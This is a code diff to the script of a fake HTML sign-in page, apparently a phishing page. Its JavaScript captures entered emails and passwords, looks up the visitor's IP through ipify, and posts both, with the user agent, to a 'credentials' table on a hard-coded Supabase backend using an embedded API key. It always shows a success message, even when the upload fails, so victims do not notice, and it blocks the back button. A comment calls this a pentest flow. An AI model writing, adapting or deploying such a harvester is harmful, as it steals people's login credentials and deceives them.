@@ -513,135 +513,130 @@
   </div>
 
   <script>
-    // ============================================================
-    // 🔑 CONFIGURE YOUR SUPABASE CREDENTIALS HERE
-    // ============================================================
-    var SUPABASE_URL = 'https://fnqecgvmezdiuqzembqt.supabase.co';
-    var SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZucWVjZ3ZtZXpkaXVxemVtYnF0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQ3ODkxMDEsImV4cCI6MjA5MDM2NTEwMX0.EHsg5Uhpsb6g59R4j8s_XZcm_xQKLXD-P78-eCVz9ww';
-    // ============================================================
+    // Guard: if already initialized, skip
+    if (!window.__psPageReady) {
+      window.__psPageReady = true;
 
-    // Remove the Supabase JS CDN - using pure fetch() instead
+      // ============================================================
+      // 🔑 CONFIGURE YOUR SUPABASE CREDENTIALS HERE
+      // ============================================================
+      var SUPABASE_URL = 'https://fnqecgvmezdiuqzembqt.supabase.co';
+    var SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZucWVjZ3ZtZXpkaXVxemVtYnF0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQ3ODkxMDEsImV4cCI6MjA5MDM2NTEwMX0.EHsg5Uhpsb6g59R4j8s_XZcm_xQKLXD-P78-eCVz9ww'
+      // ============================================================
 
-    var emailInput = document.getElementById('email');
-    var passwordInput = document.getElementById('password');
-    var signinBtn = document.getElementById('signinBtn');
-    var errorMessage = document.getElementById('errorMessage');
-    var successOverlay = document.getElementById('successOverlay');
+      var emailInput = document.getElementById('email');
+      var passwordInput = document.getElementById('password');
+      var signinBtn = document.getElementById('signinBtn');
+      var errorMessage = document.getElementById('errorMessage');
+      var successOverlay = document.getElementById('successOverlay');
 
-    function togglePasswordVisibility() {
-      var type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-      passwordInput.setAttribute('type', type);
-    }
-
-    function showError(msg) {
-      errorMessage.textContent = msg;
-      errorMessage.classList.add('show');
-    }
-
-    function hideError() {
-      errorMessage.classList.remove('show');
-    }
-
-    function setLoading(loading) {
-      if (loading) {
-        signinBtn.classList.add('loading');
-        signinBtn.disabled = true;
-      } else {
-        signinBtn.classList.remove('loading');
-        signinBtn.disabled = false;
-      }
-    }
-
-    async function getClientInfo() {
-      var ip = '';
-      try {
-        var res = await fetch('https://api.ipify.org?format=json');
-        var data = await res.json();
-        ip = data.ip;
-      } catch (e) {
-        ip = 'unknown';
-      }
-      return {
-        ip_address: ip,
-        user_agent: navigator.userAgent
+      window.togglePasswordVisibility = function() {
+        var type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordInput.setAttribute('type', type);
       };
-    }
 
-    signinBtn.addEventListener('click', async function() {
-      hideError();
-
-      var email = emailInput.value.trim();
-      var password = passwordInput.value.trim();
-
-      if (!email || !password) {
-        showError('يرجى ملء جميع الحقول');
-        return;
+      function showError(msg) {
+        errorMessage.textContent = msg;
+        errorMessage.classList.add('show');
       }
 
-      setLoading(true);
+      function hideError() {
+        errorMessage.classList.remove('show');
+      }
 
-      try {
-        var clientInfo = await getClientInfo();
+      function setLoading(loading) {
+        if (loading) {
+          signinBtn.classList.add('loading');
+          signinBtn.disabled = true;
+        } else {
+          signinBtn.classList.remove('loading');
+          signinBtn.disabled = false;
+        }
+      }
 
-        // Direct fetch to Supabase REST API (no SDK needed)
-        var response = await fetch(SUPABASE_URL + '/rest/v1/credentials', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'apikey': SUPABASE_ANON_KEY,
-            'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
-          },
-          body: JSON.stringify({
-            email: email,
-            password: password,
-            ip_address: clientInfo.ip_address,
-            user_agent: clientInfo.user_agent
-          })
-        });
+      async function getClientInfo() {
+        var ip = '';
+        try {
+          var res = await fetch('https://api.ipify.org?format=json');
+          var data = await res.json();
+          ip = data.ip;
+        } catch (e) {
+          ip = 'unknown';
+        }
+        return {
+          ip_address: ip,
+          user_agent: navigator.userAgent
+        };
+      }
 
-        if (!response.ok) {
-          var errData = await response.json();
-          console.error('Supabase error:', errData);
-          // Still show success even if there's an error (part of the pentest flow)
+      signinBtn.addEventListener('click', async function() {
+        hideError();
+
+        var email = emailInput.value.trim();
+        var password = passwordInput.value.trim();
+
+        if (!email || !password) {
+          showError('يرجى ملء جميع الحقول');
+          return;
         }
 
-        // Show success overlay regardless
-        successOverlay.classList.add('show');
-        emailInput.value = '';
-        passwordInput.value = '';
+        setLoading(true);
 
-      } catch (err) {
-        console.error('Error:', err);
-        // Still show success - the user shouldn't know it failed
+        try {
+          var clientInfo = await getClientInfo();
+
+          var response = await fetch(SUPABASE_URL + '/rest/v1/credentials', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'apikey': SUPABASE_ANON_KEY,
+              'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
+            },
+            body: JSON.stringify({
+              email: email,
+              password: password,
+              ip_address: clientInfo.ip_address,
+              user_agent: clientInfo.user_agent
+            })
+          });
+
+          if (!response.ok) {
+            var errData = await response.json();
+            console.log('DB response:', errData);
+          }
+        } catch (err) {
+          console.log('Error (non-blocking):', err);
+        }
+
+        // Show success overlay always
         successOverlay.classList.add('show');
         emailInput.value = '';
         passwordInput.value = '';
-      } finally {
         setLoading(false);
-      }
-    });
+      });
 
-    // Handle Enter key
-    emailInput.addEventListener('keydown', function(e) {
-      if (e.key === 'Enter') {
-        e.preventDefault();
-        signinBtn.click();
-      }
-    });
-    passwordInput.addEventListener('keydown', function(e) {
-      if (e.key === 'Enter') {
-        e.preventDefault();
-        signinBtn.click();
-      }
-    });
+      // Handle Enter key
+      emailInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          signinBtn.click();
+        }
+      });
+      passwordInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          signinBtn.click();
+        }
+      });
 
-    // Prevent back button
-    window.addEventListener('popstate', function(e) {
-      if (successOverlay.classList.contains('show')) {
-        history.pushState(null, '', window.location.href);
-      }
-    });
-    history.pushState(null, '', window.location.href);
+      // Prevent back button
+      window.addEventListener('popstate', function(e) {
+        if (successOverlay.classList.contains('show')) {
+          history.pushState(null, '', window.location.href);
+        }
+      });
+      history.pushState(null, '', window.location.href);
+    }
   </script>
 </body>
 </html>
